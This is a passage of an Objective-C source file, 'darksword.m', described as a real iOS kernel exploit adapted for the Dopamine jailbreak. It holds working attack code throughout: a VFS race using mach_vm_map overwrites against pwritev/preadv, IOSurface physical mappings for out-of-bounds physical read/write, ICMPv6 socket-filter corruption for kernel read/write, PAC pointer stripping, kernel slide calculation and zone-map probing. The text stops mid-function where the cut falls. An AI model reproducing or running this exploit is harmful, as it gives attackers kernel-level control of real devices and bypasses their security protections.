//
//  darksword.m — REAL exploit from rooootdev/lara
//  Adapted for Dopamine integration
//
//  Original: ruter (rooootdev), 23.03.26
//  Credits: opa334 for the kernel exploit PoC
//
//  VFS race → physical OOB R/W → ICMPv6 socket corruption → kernel R/W
//

#include "darksword_core.h"
#include "utils.h"
#include "filelog.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/uio.h>
#include <sys/utsname.h>
#include <sys/sysctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/icmp6.h>
#include <mach/mach.h>
#include <mach-o/dyld.h>
#include <CoreFoundation/CoreFoundation.h>

extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t,
    mach_vm_offset_t, int, mem_entry_name_port_t, memory_object_offset_t,
    boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern int  fileport_makeport(int fd, mach_port_t *port);
extern int  fileport_makefd(mach_port_t port);

typedef struct __IOSurface *IOSurfaceRef;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern void        *IOSurfaceGetBaseAddress(IOSurfaceRef surface);
extern void         IOSurfacePrefetchPages(IOSurfaceRef surface);

/* ================================================================
   Logging
   ================================================================ */

static ds_log_callback_t g_log_callback = NULL;

void ds_set_log_callback(ds_log_callback_t callback) {
    g_log_callback = callback;
}

void ds_logf(const char *fmt, ...) {
    char buf[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    filelog_write("%s", buf);
    if (g_log_callback) g_log_callback(buf);
    else printf("%s\n", buf);
}

static void pe_log(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
static void pe_log(const char *fmt, ...) {
    char buf[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    filelog_write("[exploit] %s", buf);
    if (g_log_callback) g_log_callback(buf);
    else printf("[PE] %s\n", buf);
}

/* ================================================================
   Macros & Constants
   ================================================================ */

#define uwrite64(a, v) (*(volatile uint64_t *)(uintptr_t)(a) = (uint64_t)(v))
#define uread64(a)     (*(volatile uint64_t *)(uintptr_t)(a))

/* PAC pointer stripping for arm64e (A12+ devices) */
#define T1SZ_BOOT 0x19
#define BIT_PAC(b) (1ULL << (b))
#define ONES_PAC(x) (BIT_PAC(x)-1)
#define PTR_MASK_PAC ONES_PAC(64 - T1SZ_BOOT)
#define PAC_MASK_BITS (~PTR_MASK_PAC)
#define SIGN_PAC(p) ((p) & BIT_PAC(55))
static inline uint64_t pac_strip(uint64_t p) {
    return SIGN_PAC(p) ? (p | PAC_MASK_BITS) : (p & ~PAC_MASK_BITS);
}

static void cmp8_wait_for_change(volatile uint64_t *ptr, uint64_t old_val) {
    while (*ptr == old_val) ;
}

#define PAGE_SZ          0x4000ULL
#define F_NOCACHE_       48
#define EARLY_KRW_LENGTH 0x20ULL
#define UNSLID_BASE_LEGACY 0xfffffff007004000ULL
#define UNSLID_BASE_ARM64E 0xFFFFFFF00700C000ULL
#define KERNEL_SLIDE_GRANULARITY 0x200000ULL

static uint64_t compute_kernel_slide(uint64_t kbase, uint64_t *used_unslid_base) {
    uint64_t selected_base = UNSLID_BASE_LEGACY;
    if (kbase >= UNSLID_BASE_ARM64E) {
        uint64_t slide_legacy = kbase - UNSLID_BASE_LEGACY;
        uint64_t slide_arm64e = kbase - UNSLID_BASE_ARM64E;
        bool legacy_aligned = ((slide_legacy % KERNEL_SLIDE_GRANULARITY) == 0);
        bool arm64e_aligned = ((slide_arm64e % KERNEL_SLIDE_GRANULARITY) == 0);
        if (arm64e_aligned && !legacy_aligned) {
            selected_base = UNSLID_BASE_ARM64E;
        }
    }
    if (used_unslid_base) *used_unslid_base = selected_base;
    return kbase - selected_base;
}

/* ================================================================
   Global state
   ================================================================ */

static bool g_ds_ready = false;

static uint64_t random_marker;
static uint64_t wired_page_marker;

static uint64_t target_file_size;
static uint64_t oob_offset = 0x100;
static uint64_t oob_size   = 0xf00;
static uint64_t n_of_oob_pages = 2;

static uint64_t pc_address;
static uint64_t pc_size;
static mach_port_t pc_object;

static uint64_t free_target;
static uint64_t free_target_size;
static int write_fd;
static int read_fd;

static volatile uint64_t *free_thread_start_ptr;
static volatile uint64_t *free_target_sync_ptr;
static volatile uint64_t *free_target_size_sync_ptr;
static volatile uint64_t *target_object_sync_ptr;
static volatile uint64_t *target_object_offset_sync_ptr;
static volatile uint64_t *go_sync_ptr;
static volatile uint64_t *race_sync_ptr;
static volatile uint64_t target_object_size;

static char *executable_name;

static int control_socket;
static int rw_socket;
static uint64_t control_socket_pcb;
static uint64_t rw_socket_pcb;
static bool g_corruption_snapshot_valid;
static uint64_t g_corruption_snapshot_pcb;
static uint64_t g_corruption_snapshot_filter_qword0;
static uint64_t g_corruption_snapshot_filter_qword1;

static uint64_t kernel_base;
static uint64_t kernel_slide;
static uint64_t our_proc;
static uint64_t our_task;
static bool g_panic_guard_abort_latched;
static bool g_socket_teardown_hardened;
static int g_proc_read_scope_depth;
static int g_proc_scope_block_count;
static bool g_proc_scope_block_latched;
static const int k_proc_scope_block_trip_threshold = 32;

/* Zone map boundaries — discovered at runtime from kernel memory.
 * zone_map is always exactly 24 GB (ZONE_MAP_VIRTUAL_SIZE_LP64 in XNU).
 * These are set by discover_zone_boundaries() before allproc scanning. */
static uint64_t g_zone_map_min = 0;
static uint64_t g_zone_map_max = 0;
/* Bug #225: "safe" lower bound for heap object reads.
 * VM submap (per-CPU allocs) + RO submap occupy the first ~20% of zone_map.
 * Reading from per-CPU zone elements via copyout() triggers:
 *   panic: zone bound checks: address X is a per-cpu allocation
 * g_zone_safe_min = zone_map_min + ZONE_MAP_SPAN/4 (6 GB) skips VM+RO. */
static uint64_t g_zone_safe_min = 0;
#define ZONE_MAP_SPAN 0x600000000ULL  /* 24 GB — constant across all boots */

static uint64_t highest_success_idx;
static uint64_t success_read_count;
static bool is_a18_devices;

#define MAX_SOCKET_PORTS 32768
#define V1_SOCKET_SPRAY_TARGET 12288ULL
#define V1_SOCKET_SPRAY_LEEWAY 4096ULL
#define V2_SOCKET_SPRAY_TARGET 0x3800ULL
#define V2_SOCKET_SPRAY_SPLIT 8ULL
static mach_port_t socket_ports[MAX_SOCKET_PORTS];
static uint64_t    socket_pcb_ids[MAX_SOCKET_PORTS];
static uint64_t    socket_ports_count;

static uint8_t control_data[EARLY_KRW_LENGTH];
static uint8_t early_kwrite64_write_buf[EARLY_KRW_LENGTH];
static struct iovec iov;

#define MAX_MLOCK 4096
static struct { uint64_t address; IOSurfaceRef surf; } mlock_dict[MAX_MLOCK];
static int mlock_dict_count;

static pthread_t free_thread_jsthread;
static volatile bool g_free_thread_should_exit = false;
static bool g_free_thread_created = false;
static uint8_t *g_free_thread_arg = NULL;
static uint64_t free_thread_map_fail_count = 0;

static void restore_corrupted_socket_filter_best_effort(void);
static void abort_cleanup_corrupted_sockets_best_effort(void);
static bool park_corrupted_socket_filter_target_to_self(void);

static inline int fail_after_corruption_cleanup(void) {
    /*
     * Bug #320: pre-hardened panic-guard sessions can still leave the last
     * speculative target_kaddr parked on rw_socket_pcb+0x150. Even if we
     * rollback icmp6filt qword0/qword1 afterwards, terminate-time teardown may
     * still treat that stale embedded slot as a standalone small allocation.
     *
     * Neutralize the live target first, then do best-effort rollback.
     */
    park_corrupted_socket_filter_target_to_self();
    restore_corrupted_socket_filter_best_effort();
    abort_cleanup_corrupted_sockets_best_effort();
    return -1;
}

static inline int panic_guard_abort_cleanup(void) {
    g_panic_guard_abort_latched = true;
    /* Bug #301: once krw_sockets_leak_forever() has already installed the
     * teardown hardening, panic-guard abort must NOT restore icmp6filt back
     * into the inpcb. Session 25f still produced a late zone panic with
     * address rw_socket_pcb+0x150, which means post-abort teardown was still
     * interpreting the embedded icmp6filt area as a standalone zoned object.
     *
     * At that stage the safer policy is:
     * - keep the leak/refcount hardening in place
     * - park the corrupted filter target back onto its self-slot
     * - quarantine the fds / global pcb state
     * - skip rollback of icmp6filt entirely
     */
    if (g_socket_teardown_hardened) {
        pe_log("PANIC GUARD: leak-hardening already active — skipping icmp6filt rollback");
        park_corrupted_socket_filter_target_to_self();
        abort_cleanup_corrupted_sockets_best_effort();
        return -1;
    }

    /*
     * Bug #321: fresh runtime after Bug #320 proved that pre-hardened abort
     * still panics at rw_socket_pcb + 0x150 even when we first neutralize the
     * stale target and then rollback qword0/qword1.
     *
     * The late panic means terminate-time teardown remains sensitive to *any*
     * post-abort write-back into the embedded icmp6filt slot. For panic-guard
     * failures after successful early KRW but before success-only hardening,
     * the safer policy now matches the leak-hardened branch:
     * - park target back onto self-slot
     * - skip rollback entirely
     * - quarantine fds / pcb globals without close
     */
    pe_log("PANIC GUARD: pre-hardened abort — skipping icmp6filt rollback, parking self target and quarantining fds");
    park_corrupted_socket_filter_target_to_self();
    abort_cleanup_corrupted_sockets_best_effort();
    return -1;
}

#define MAX_GENCNT 256
static uint64_t target_inp_gencnt_list[MAX_GENCNT];
static int target_inp_gencnt_count;

#define MAX_PE_V1_ATTEMPTS 64
#define MAX_PE_V2_ATTEMPTS 64

static uint8_t socket_info[0x400];

static uint64_t getsockopt_read_length = 32;
static uint8_t  getsockopt_read_data[32];

static uint8_t kwrite_length_buffer[EARLY_KRW_LENGTH];

static uint8_t *default_file_content;

static void close_target_fds(void) {
    if (read_fd >= 0) {
        close(read_fd);
        read_fd = -1;
    }
    if (write_fd >= 0) {
        close(write_fd);
        write_fd = -1;
    }
}

static void reset_transient_state(void) {
    close_target_fds();
    socket_ports_count = 0;
    target_inp_gencnt_count = 0;
    highest_success_idx = 0;
    success_read_count = 0;
    target_object_size = 0;
    free_thread_map_fail_count = 0;
    pc_address = 0;
    pc_size = 0;
    pc_object = MACH_PORT_NULL;
    free_target = 0;
    free_target_size = 0;
    g_corruption_snapshot_valid = false;
    g_corruption_snapshot_pcb = 0;
    g_corruption_snapshot_filter_qword0 = 0;
    g_corruption_snapshot_filter_qword1 = 0;
    g_socket_teardown_hardened = false;
    read_fd = -1;
    write_fd = -1;

    for (int i = 0; i < mlock_dict_count; i++) {
        if (mlock_dict[i].surf) {
            CFRelease(mlock_dict[i].surf);
            mlock_dict[i].surf = NULL;
        }
        mlock_dict[i].address = 0;
    }
    mlock_dict_count = 0;
    if (g_free_thread_arg) {
        free(g_free_thread_arg);
        g_free_thread_arg = NULL;
    }
}

/* ================================================================
   Race thread: mach_vm_map OVERWRITE vs pwritev/preadv
   ================================================================ */

static bool wait_for_change_or_abort(volatile uint64_t *ptr, uint64_t old_val) {
    while (*ptr == old_val) {
        if (g_free_thread_should_exit) {
            return false;
        }
    }
    return true;
}

static void *free_thread(void *arg) {
    if (!wait_for_change_or_abort(free_thread_start_ptr, 0)) return NULL;

    uint64_t ft      = *free_target_sync_ptr;
    uint64_t ft_size = *free_target_size_sync_ptr;

    if (!wait_for_change_or_abort(go_sync_ptr, 0)) return NULL;

    while (!g_free_thread_should_exit && uread64((uint64_t)go_sync_ptr) != 0) {
        if (!wait_for_change_or_abort(race_sync_ptr, 0)) return NULL;

        mach_port_t target_object        = (mach_port_t)*target_object_sync_ptr;
        uint64_t    target_object_offset = *target_object_offset_sync_ptr;
        uint64_t    target_object_size_local = target_object_size;

        if (target_object == MACH_PORT_NULL || ft_size == 0 || target_object_size_local < ft_size) {
            uwrite64((uint64_t)race_sync_ptr, 0);
            continue;
        }

        memory_object_offset_t adjusted_offset =
            (memory_object_offset_t)(target_object_offset & ~((uint64_t)PAGE_SZ - 1));
        if (adjusted_offset + ft_size > target_object_size_local) {
            adjusted_offset = (memory_object_offset_t)
                ((target_object_size_local - ft_size) & ~((uint64_t)PAGE_SZ - 1));
        }

        mach_vm_address_t addr = ft;
        kern_return_t kr = KERN_FAILURE;
        for (int retry = 0; retry < 5; retry++) {
            kr = mach_vm_map(
                mach_task_self(), &addr, ft_size, 0,
                VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                target_object, adjusted_offset,
                FALSE, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
            if (kr == KERN_SUCCESS) break;
            usleep(200);
        }

        if (kr != KERN_SUCCESS) {
            free_thread_map_fail_count++;
            if ((free_thread_map_fail_count % 128) == 1) {
                pe_log("mach_vm_map failed in free_thread: kr=%d cnt=%llu",
                       kr, free_thread_map_fail_count);
                pe_log("    free_target=0x%llx size=0x%llx target_object=0x%x off=0x%llx adjusted=0x%llx obj_size=0x%llx",
                       ft, ft_size, target_object, target_object_offset,
                       (uint64_t)adjusted_offset, target_object_size_local);
            }
        }

        uwrite64((uint64_t)race_sync_ptr, 0);
    }
    return NULL;
}

/* ================================================================
   File setup for the VFS race
   ================================================================ */

static bool create_target_file(const char *path) {
    FILE *fd = fopen(path, "w");
    if (!fd) { pe_log("fopen failed: %s", path); return false; }
    size_t nw = fwrite(default_file_content, 1, target_file_size, fd);
    fclose(fd);
    if (nw != target_file_size) {
        pe_log("short fwrite for %s: %llu/%llu", path, (uint64_t)nw, target_file_size);
        return false;
    }
    return true;
}

static bool init_target_file(void) {
    char read_file_path[1024], write_file_path[1024];

    memset(read_file_path, 0, sizeof(read_file_path));
    memset(write_file_path, 0, sizeof(write_file_path));
    size_t read_len = confstr(_CS_DARWIN_USER_TEMP_DIR, read_file_path, sizeof(read_file_path));
    size_t write_len = confstr(_CS_DARWIN_USER_TEMP_DIR, write_file_path, sizeof(write_file_path));
    if (read_len == 0 || read_len >= sizeof(read_file_path) ||
        write_len == 0 || write_len >= sizeof(write_file_path)) {
        pe_log("init_target_file: confstr(_CS_DARWIN_USER_TEMP_DIR) failed or truncated");
        return false;
    }

    char suffix[32];
    snprintf(suffix, sizeof(suffix), "/%08x", arc4random());
    strcat(read_file_path, suffix);
    snprintf(suffix, sizeof(suffix), "/%08x", arc4random());
    strcat(write_file_path, suffix);

    if (!create_target_file(read_file_path) || !create_target_file(write_file_path)) {
        remove(read_file_path);
        remove(write_file_path);
        return false;
    }

    read_fd  = open(read_file_path, O_RDWR);
    write_fd = open(write_file_path, O_RDWR);
    pe_log("read_fd: 0x%x", read_fd);
    pe_log("write_fd: 0x%x", write_fd);

    if (read_fd < 0 || write_fd < 0) {
        pe_log("init_target_file failed: read_fd=%d write_fd=%d errno=%d", read_fd, write_fd, errno);
        if (read_fd >= 0) { close(read_fd); read_fd = -1; }
        if (write_fd >= 0) { close(write_fd); write_fd = -1; }
        remove(read_file_path);
        remove(write_file_path);
        return false;
    }

    remove(read_file_path);
    remove(write_file_path);
    fcntl(read_fd,  F_NOCACHE_, 1);
    fcntl(write_fd, F_NOCACHE_, 1);
    return true;
}

/* ================================================================
   IOSurface-based physically contiguous mapping
   ================================================================ */

static bool create_physically_contiguous_mapping(mach_port_t *port,
                                                 uint64_t *address, uint64_t size)
{
    if (port) *port = MACH_PORT_NULL;
    if (address) *address = 0;

    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    if (!dict) {
        pe_log("CFDictionaryCreateMutable failed!");
        return false;
    }

    int64_t sz = (int64_t)size;
    CFNumberRef cf_number = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &sz);
    if (!cf_number) {
        pe_log("CFNumberCreate failed!");
        CFRelease(dict);
        return false;
    }
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), cf_number);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));

    IOSurfaceRef surface = IOSurfaceCreate(dict);
    CFRelease(dict);
    if (!surface) {
        pe_log("Failed to create IOSurface!");
        CFRelease(cf_number);
        return false;
    }

    void *physical_mapping_address = IOSurfaceGetBaseAddress(surface);
    pe_log("physical_mapping_address: %p", physical_mapping_address);
    if (!physical_mapping_address) {
        pe_log("IOSurfaceGetBaseAddress returned NULL!");
        CFRelease(surface);
        CFRelease(cf_number);
        return false;
    }

    memory_object_size_t entry_size = size;
    mach_port_t memory_object = MACH_PORT_NULL;
    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &entry_size,
        (mach_vm_address_t)physical_mapping_address,
        VM_PROT_DEFAULT, &memory_object, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        pe_log("mach_make_memory_entry_64 failed!");
        CFRelease(surface);
        CFRelease(cf_number);
        return false;
    }

    mach_vm_address_t new_mapping_address = 0;
    kr = mach_vm_map(mach_task_self(), &new_mapping_address, size, 0,
        VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR,
        memory_object, 0, FALSE, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) {
        pe_log("mach_vm_map failed!");
        mach_port_deallocate(mach_task_self(), memory_object);
        CFRelease(surface);
        CFRelease(cf_number);
        return false;
    }

    CFRelease(surface);
    CFRelease(cf_number);
    *port    = memory_object;
    *address = (uint64_t)new_mapping_address;
    return true;
}

static bool initialize_physical_read_write(uint64_t contiguous_mapping_size) {
    pc_size = contiguous_mapping_size;
    if (!create_physically_contiguous_mapping(&pc_object, &pc_address, pc_size) ||
        pc_object == MACH_PORT_NULL || pc_address == 0) {
        pe_log("initialize_physical_read_write failed");
        return false;
    }
    pe_log("pc_object: 0x%x", pc_object);
    pe_log("pc_address: 0x%llx", pc_address);

    for (uint64_t i = 0; i < pc_size; i += 8)
        uwrite64(pc_address + i, random_marker);

    free_target      = pc_address;
    free_target_size = pc_size;
    uwrite64((uint64_t)free_target_sync_ptr, free_target);
    uwrite64((uint64_t)free_target_size_sync_ptr, free_target_size);
    uwrite64((uint64_t)free_thread_start_ptr, 1);
    uwrite64((uint64_t)go_sync_ptr, 1);
    return true;
}

/* ================================================================
   IOSurface helpers for wired-page tracking (A18 path)
   ================================================================ */

static IOSurfaceRef create_surface_with_address(uint64_t address, uint64_t size) {
    CFMutableDictionaryRef properties = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    if (!properties) {
        pe_log("CFDictionaryCreateMutable failed in create_surface_with_address");
        return NULL;
    }

    int64_t addr_val = (int64_t)address;
    CFNumberRef address_number = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &addr_val);
    if (!address_number) {
        pe_log("CFNumberCreate(address) failed in create_surface_with_address");
        CFRelease(properties);
        return NULL;
    }
    CFDictionarySetValue(properties, CFSTR("IOSurfaceAddress"), address_number);

    int64_t size_val = (int64_t)size;
    CFNumberRef size_number = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &size_val);
    if (!size_number) {
        pe_log("CFNumberCreate(size) failed in create_surface_with_address");
        CFRelease(address_number);
        CFRelease(properties);
        return NULL;
    }
    CFDictionarySetValue(properties, CFSTR("IOSurfaceAllocSize"), size_number);

    IOSurfaceRef surface = IOSurfaceCreate(properties);
    if (surface) {
        IOSurfacePrefetchPages(surface);
    } else {
        pe_log("IOSurfaceCreate failed in create_surface_with_address");
    }
    CFRelease(address_number);
    CFRelease(size_number);
    CFRelease(properties);
    return surface;
}

static void surface_mlock(uint64_t address, uint64_t size) {
    IOSurfaceRef surf = create_surface_with_address(address, size);
    if (!surf) return;
    if (mlock_dict_count < MAX_MLOCK) {
        mlock_dict[mlock_dict_count].address = address;
        mlock_dict[mlock_dict_count].surf    = surf;
        mlock_dict_count++;
    } else {
        CFRelease(surf);
    }
}

static void surface_munlock(uint64_t address, uint64_t size) {
    for (int i = 0; i < mlock_dict_count; i++) {
        if (mlock_dict[i].address == address && mlock_dict[i].surf) {
            CFRelease(mlock_dict[i].surf);
            mlock_dict[i].surf = NULL;
            return;
        }
    }
}

/* ================================================================
   Physical OOB read / write via the VFS race
   ================================================================ */

static kern_return_t physical_oob_read_mo(mach_port_t mo, uint64_t mo_offset,
                                           uint64_t size, uint64_t offset,
                                           void *buffer)
{
    uwrite64((uint64_t)target_object_sync_ptr, (uint64_t)mo);
    memory_object_offset_t adjusted_offset =
        (memory_object_offset_t)(mo_offset & ~((uint64_t)PAGE_SZ - 1));
    uint64_t current_target_object_size = target_object_size;
    if (current_target_object_size >= free_target_size &&
        adjusted_offset + free_target_size > current_target_object_size) {
        adjusted_offset = (memory_object_offset_t)
            ((current_target_object_size - free_target_size) & ~((uint64_t)PAGE_SZ - 1));
    }
    uwrite64((uint64_t)target_object_offset_sync_ptr, adjusted_offset);

    iov.iov_base = (void *)(uintptr_t)(pc_address + 0x3f00);
    iov.iov_len  = offset + size;
    *(uint64_t *)buffer = random_marker;
    uwrite64(pc_address + 0x3f00 + offset, random_marker);

    bool read_race_succeeded = false;
    ssize_t w = 0;

    for (uint64_t try_idx = 0; try_idx < highest_success_idx + 100; try_idx++) {
        uwrite64((uint64_t)race_sync_ptr, 1);
        w = pwritev(read_fd, &iov, 1, 0x3f00);
        cmp8_wait_for_change(race_sync_ptr, 1);

        mach_vm_address_t addr = pc_address;
        kern_return_t kr = mach_vm_map(mach_task_self(), &addr, pc_size, 0,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
            pc_object, 0, FALSE, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) { pe_log("mach_vm_map failed (oob_read)!"); return kr; }

        if (w == (ssize_t)-1) {
            ssize_t r = pread(read_fd, buffer, size, 0x3f00 + offset);
            (void)r;
            uint64_t marker = *(uint64_t *)buffer;

            if (marker != random_marker) {
                read_race_succeeded = true;
                success_read_count++;
                if (try_idx > highest_success_idx)
                    highest_success_idx = try_idx;
                break;
            } else {
                usleep(1);
            }
        }
        if (try_idx == 500) break;
    }

    uwrite64((uint64_t)target_object_sync_ptr, 0);
    if (!read_race_succeeded) return 1;
    return KERN_SUCCESS;
}

static bool physical_oob_read_mo_with_retry(mach_port_t memory_object,
                                             uint64_t seeking_offset,
                                             uint64_t oob_sz, uint64_t oob_off,
                                             void *read_buffer)
{
    for (int read_try = 0; read_try < 256; read_try++) {
        kern_return_t kr = physical_oob_read_mo(memory_object, seeking_offset,
                                                 oob_sz, oob_off, read_buffer);
        if (kr == KERN_SUCCESS) return true;
    }
    pe_log("physical_oob_read_mo_with_retry: read did not succeed after 256 attempts");
    return false;
}

static void physical_oob_write_mo(mach_port_t mo, uint64_t mo_offset,
                                   uint64_t size, uint64_t offset, void *buffer)
{
    uwrite64((uint64_t)target_object_sync_ptr, (uint64_t)mo);
    memory_object_offset_t adjusted_offset =
        (memory_object_offset_t)(mo_offset & ~((uint64_t)PAGE_SZ - 1));
    uint64_t current_target_object_size = target_object_size;
    if (current_target_object_size >= free_target_size &&
        adjusted_offset + free_target_size > current_target_object_size) {
        adjusted_offset = (memory_object_offset_t)
            ((current_target_object_size - free_target_size) & ~((uint64_t)PAGE_SZ - 1));
    }
    uwrite64((uint64_t)target_object_offset_sync_ptr, adjusted_offset);

    iov.iov_base = (void *)(uintptr_t)(pc_address + 0x3f00);
    iov.iov_len  = offset + size;
    pwrite(write_fd, buffer, size, 0x3f00 + offset);

    for (uint64_t try_idx = 0; try_idx < 20; try_idx++) {
        uwrite64((uint64_t)race_sync_ptr, 1);
        preadv(write_fd, &iov, 1, 0x3f00);
        cmp8_wait_for_change(race_sync_ptr, 1);

        mach_vm_address_t addr = pc_address;
        kern_return_t kr = mach_vm_map(mach_task_self(), &addr, pc_size, 0,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
            pc_object, 0, FALSE, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) { pe_log("mach_vm_map failed (oob_write)!"); return; }
    }
    uwrite64((uint64_t)target_object_sync_ptr, 0);
}

/* ================================================================
   Zone boundary discovery (runtime)
   ================================================================
   zone_info {min_address, max_address} is a SECURITY_READ_ONLY_LATE
   global in kernel __DATA_CONST, typically near zone_array[].
   ipi_zone (the ICMPv6 PCB zone) points into zone_array[], so we
   search backwards from it for the distinctive {a, b} pair where
   b − a == ZONE_MAP_SPAN (24 GB) and rw_socket_pcb ∈ [a, b).
   ================================================================ */

/* Forward declarations — needed because discover_zone_boundaries uses
   kread_length which is defined later.  We take the raw setsockopt/getsockopt
   path directly here so the function is self-contained. */
static void discover_zone_boundaries_raw(uint64_t ipi_zone_addr);
static bool kread_length_checked(uint64_t address, void *buffer, uint64_t size);
static void prime_zone_bounds_from_rw_pcb(const char *reason);

/* ================================================================
   Early kernel R/W via corrupted ICMP6_FILTER
   ================================================================ */

static void prime_zone_bounds_from_rw_pcb(const char *reason) {
    if (rw_socket_pcb < 0xffffffd000000000ULL || rw_socket_pcb >= 0xfffffff000000000ULL) {
        return;
    }

    /* Bug #224: struct socket lives in a DIFFERENT zone than struct inpcb.
     * On A12Z/iOS 17 the distance is ~11.5 GB, which is beyond the old
     * ZONE_MAP_SPAN/3 (8 GB) window.  Use the full ZONE_MAP_SPAN (24 GB)
     * as the half-width — this guarantees coverage of the entire 24 GB
     * zone_map regardless of where the PCB sits within it. */
    const uint64_t EARLY_SPAN = ZONE_MAP_SPAN; /* 24 GB — covers full zone_map */
    uint64_t min = (rw_socket_pcb > EARLY_SPAN) ?
                   (rw_socket_pcb - EARLY_SPAN) : 0xffffffd000000000ULL;
    uint64_t max = rw_socket_pcb + EARLY_SPAN;

    if (min < 0xffffffd000000000ULL) min = 0xffffffd000000000ULL;
    if (max > 0xfffffff000000000ULL) max = 0xfffffff000000000ULL;

    if (g_zone_map_min == min && g_zone_map_max == max) {
        return;
    }

    g_zone_map_min = min;
    g_zone_map_max = max;
    /* Bug #225: derive safe_min that skips VM+RO submaps (per-CPU zone) */
    g_zone_safe_min = min + ZONE_MAP_SPAN / 4;
    if (g_zone_safe_min > max) g_zone_safe_min = min; /* sanity */
    pe_log("zone bounds primed from rw_socket_pcb (%s): [0x%llx - 0x%llx] safe_min=0x%llx",
           reason ? reason : "unknown", g_zone_map_min, g_zone_map_max, g_zone_safe_min);
}

static bool set_target_kaddr(uint64_t where) {
    /* SAFETY: 'where' must be a valid, readable kernel virtual address.
     *
     * Valid ranges on arm64e iOS (with runtime zone discovery):
     *   Zone map objects: [g_zone_map_min, g_zone_map_max) — discovered at runtime
     *   Kernel text/data: [0xfffffff000000000, 0xffffffff00000000)
     *
     * Zone METADATA and BITMAPS are OUTSIDE the zone_map and may reside on
     * pages that are NOT mapped (translation fault L3 → kernel data abort!).
     * Their position varies per boot: sometimes ABOVE, sometimes BELOW zone_map.
     *
     * Returns false if address is blocked (callers MUST NOT proceed with
     * getsockopt/setsockopt on rw_socket — it would read/write STALE address).
     *
     * ALIGNMENT: copyout() on arm64e validates zone-map source addresses by
     * reading Zone Metadata for the covering page.  If the address is misaligned
     * (tagged pointer, bit0=1) it may land on an unallocated zone page whose
     * metadata entry is NOT MAPPED → translation-fault L3 panic.
     * Block all non-8-byte-aligned addresses in zone_map range as a safety net.
     * Bug #223: reverted from & 3 back to & 7. The so_count read/write at
     * 4-byte-aligned offset (0x24c) uses kread32_aligned/kwrite32_aligned
     * helpers that round down to 8-byte boundary internally, so this strict
     * check no longer blocks those operations.
     * Kernel text/data reads use memcpy internally and tolerate any alignment. */
    if (g_proc_read_scope_depth <= 0) {
        g_proc_scope_block_count = 0;
        g_proc_scope_block_latched = false;
    } else if (g_proc_scope_block_latched) {
        static int s_scope_latch_log_count = 0;
        if (++s_scope_latch_log_count <= 3) {
            pe_log("set_target_kaddr: PANIC GUARD active in proc-scope, rejecting addr 0x%llx", where);
        }
        return false;
    }

    if (where >= 0xfffffff000000000ULL) {
        /* Kernel text/data candidate.
         * Bug #417: a coarse allow-range up to 0xffffffff accepted junk
         * high-half addresses like 0xfffffffd52800039, which later panic in
         * copy_validate("kaddr not in kernel"). Keep non-zone reads flexible,
         * but block implausible high addresses and (when known) enforce a
         * bounded window around discovered kernel_base. */
        const uint64_t ktext_max_coarse = 0xfffffff800000000ULL;
        if (where >= ktext_max_coarse) {
            pe_log("set_target_kaddr: BLOCKED high non-kernel text/data addr 0x%llx (coarse max=0x%llx)",
                   where, ktext_max_coarse);
            if (g_proc_read_scope_depth > 0 && !g_proc_scope_block_latched && ++g_proc_scope_block_count >= k_proc_scope_block_trip_threshold) {
                g_proc_scope_block_latched = true;
                pe_log("set_target_kaddr: PANIC GUARD tripped in proc-scope after %d blocked candidates", g_proc_scope_block_count);
            }
            return false;
        }
        if (kernel_base >= 0xfffffff000000000ULL) {
            uint64_t ktext_min = (kernel_base > 0x02000000ULL) ?
                                 (kernel_base - 0x02000000ULL) : 0xfffffff000000000ULL;
            uint64_t ktext_max = kernel_base + 0x80000000ULL;
            if (ktext_max < kernel_base || ktext_max > 0xffffffff00000000ULL) {
                ktext_max = 0xffffffff00000000ULL;
            }
            if (where < ktext_min || where >= ktext_max) {
                pe_log("set_target_kaddr: BLOCKED text/data addr outside kbase window [0x%llx,0x%llx): 0x%llx",
                       ktext_min, ktext_max, where);
                if (g_proc_read_scope_depth > 0 && !g_proc_scope_block_latched && ++g_proc_scope_block_count >= k_proc_scope_block_trip_threshold) {
                    g_proc_scope_block_latched = true;
                    pe_log("set_target_kaddr: PANIC GUARD tripped in proc-scope after %d blocked candidates", g_proc_scope_block_count);
                }
                return false;
            }
        }
    } else if (where & 7) {
